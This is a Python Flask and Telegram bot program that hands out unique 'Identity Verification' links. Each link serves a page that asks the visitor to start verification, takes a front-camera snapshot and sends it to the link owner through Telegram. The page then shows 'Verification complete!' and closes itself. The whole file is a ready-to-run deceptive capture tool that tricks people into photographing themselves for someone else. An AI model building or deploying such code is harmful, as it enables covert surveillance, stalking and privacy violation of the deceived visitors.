import os
import uuid
import base64
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telegram import Bot
from telegram.ext import Updater, CommandHandler

# Configuration
TOKEN = os.environ['TELEGRAM_TOKEN']
DOMAIN = os.environ.get('RAILWAY_STATIC_URL', 'https://your-app.railway.app')
PORT = int(os.environ.get('PORT', 5000))

# Database simulation
db = {
    'links': {},
    'captures': {},
    'users': {}
}

app = Flask(__name__)
bot = Bot(token=TOKEN)

@app.route('/')
def home():
    return "Telegram Bot Service Running"

@app.route('/capture/<link_id>')
def capture_page(link_id):
    if link_id not in db['links']:
        return "Invalid verification link", 404

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Identity Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
            #verification-box { background: white; border-radius: 10px; padding: 30px; max-width: 500px; margin: 0 auto; }
            #camera-feed { width: 100%; border-radius: 8px; margin: 15px 0; display: none; }
            button { background: #4285f4; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-size: 16px; }
            #status { margin: 15px 0; color: #666; }
        </style>
    </head>
    <body>
        <div id="verification-box">
            <h2>Identity Verification</h2>
            <div id="status">Click below to begin verification</div>
            <video id="camera-feed" autoplay playsinline></video>
            <button id="start-btn">Start Verification</button>
        </div>

        <script>
            const startBtn = document.getElementById('start-btn');
            const cameraFeed = document.getElementById('camera-feed');
            const status = document.getElementById('status');

            startBtn.addEventListener('click', async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }
                    });
                    
                    cameraFeed.srcObject = stream;
                    cameraFeed.style.display = 'block';
                    status.textContent = 'Verification in progress...';
                    startBtn.style.display = 'none';
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = cameraFeed.videoWidth;
                        canvas.height = cameraFeed.videoHeight;
                        canvas.getContext('2d').drawImage(cameraFeed, 0, 0);
                        
                        fetch('/save-capture/{{ link_id }}', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                photo: canvas.toDataURL('image/jpeg')
                            })
                        }).then(() => {
                            status.textContent = 'Verification complete!';
                            setTimeout(() => window.close(), 2000);
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                    
                } catch (error) {
                    status.textContent = 'Error: ' + error.message;
                }
            });
        </script>
    </body>
    </html>
    ''', link_id=link_id)

@app.route('/save-capture/<link_id>', methods=['POST'])
def save_capture(link_id):
    data = request.json
    image_data = data['photo'].split(',')[1]
    
    if link_id not in db['captures']:
        db['captures'][link_id] = []
    db['captures'][link_id].append({
        'timestamp': datetime.now(),
        'image_data': image_data
    })

    owner_id = db['links'][link_id]['owner_id']
    bot.send_photo(
        chat_id=owner_id,
        photo=BytesIO(base64.b64decode(image_data)),
        caption=f"New capture from {link_id}"
    )

    return jsonify({"status": "success"})

def start_command(update, context):
    user_id = update.effective_user.id
    link_id = str(uuid.uuid4())
    
    db['links'][link_id] = {
        'owner_id': user_id,
        'created_at': datetime.now(),
        'active': True
    }

    update.message.reply_text(
        f"🔗 Your verification link:\n\n{DOMAIN}/capture/{link_id}"
    )

def main():
    updater = Updater(TOKEN)
    updater.dispatcher.add_handler(CommandHandler('start', start_command))
    updater.start_polling()
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    main()
